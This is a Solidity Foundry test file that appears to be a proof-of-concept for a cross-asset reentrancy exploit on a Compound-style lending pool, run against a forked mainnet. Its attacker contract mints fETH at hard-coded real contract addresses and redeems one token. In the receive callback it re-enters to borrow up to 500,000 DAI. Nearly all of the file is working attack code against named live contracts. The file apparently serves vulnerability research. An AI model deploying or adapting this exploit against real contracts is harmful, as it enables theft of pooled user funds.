// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface ICEther {
    function mint() external payable;
    function redeem(uint256) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IComptroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
    function getAccountLiquidity(address) external view returns (uint256, uint256, uint256);
}

interface ICErc20 {
    function borrow(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
    function underlying() external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

/// @dev Test cross-asset reentrancy: mint fETH, redeem(1), borrow DAI in callback
contract CrossAssetAttacker {
    address constant COMPTROLLER = 0x814b02C1ebc9164972D888495927fe1697F0Fb4c;
    address constant F6_ETH = 0xF6551C22276b9Bf62FaD09f6bD6Cad0264b89789;
    address constant F_DAI_6 = 0x989273ec41274C4227bCB878C2c26fdd3afbE70d;

    address payable public immutable owner;
    bool public inRedeem;
    bool public borrowInCallback;
    uint256 public daiBorrowed;

    constructor() { owner = payable(msg.sender); }

    function attack() external payable {
        console.log("=== Cross-Asset Reentrancy Test ===");
        console.log("ETH supplied:", msg.value / 1e18);

        // Mint fETH
        ICEther(F6_ETH).mint{value: msg.value}();
        uint256 cBal = ICEther(F6_ETH).balanceOf(address(this));
        console.log("cTokens:", cBal);

        // Enter fETH market as collateral
        address[] memory m = new address[](1);
        m[0] = F6_ETH;
        IComptroller(COMPTROLLER).enterMarkets(m);

        // Check liquidity
        (uint256 e, uint256 l, uint256 s) = IComptroller(COMPTROLLER).getAccountLiquidity(address(this));
        console.log("Liquidity before redeem:", l / 1e18);

        // Redeem 1 cToken to trigger callback
        inRedeem = true;
        borrowInCallback = false;
        uint256 r = ICEther(F6_ETH).redeem(1);
        inRedeem = false;
        console.log("Redeem result:", r);
        console.log("Borrow in callback:", borrowInCallback);
        console.log("DAI borrowed:", daiBorrowed / 1e18);

        address dai = ICErc20(F_DAI_6).underlying();
        console.log("DAI balance:", IERC20(dai).balanceOf(address(this)) / 1e18);

        // Return ETH
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!inRedeem || msg.sender != F6_ETH) return;
        inRedeem = false;

        console.log("  [callback] Attempting to borrow DAI...");

        // Try to borrow DAI during the fETH redeem callback
        // If cross-asset guard is absent, this should work!
        uint256 daiCash = ICErc20(F_DAI_6).getCash();
        uint256 amt = daiCash > 500_000 ether ? 500_000 ether : daiCash;

        try ICErc20(F_DAI_6).borrow(amt) returns (uint256 ret) {
            console.log("  [callback] Borrow result:", ret);
            if (ret == 0) {
                borrowInCallback = true;
                daiBorrowed = amt;
                console.log("  [callback] SUCCESS! Borrowed DAI:", amt / 1e18);
            } else {
                console.log("  [callback] Borrow returned error code:", ret);
            }
        } catch Error(string memory reason) {
            console.log("  [callback] Borrow REVERTED:", reason);
        } catch {
            console.log("  [callback] Borrow REVERTED (low-level)");
        }
    }
}

contract Pool6CrossAsset is Test {
    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH3_FEIRARI"));
    }

    function test_cross_asset_borrow() public {
        vm.deal(address(this), 2000 ether);
        CrossAssetAttacker a = new CrossAssetAttacker();
        a.attack{value: 1000 ether}();
    }

    receive() external payable {}
}
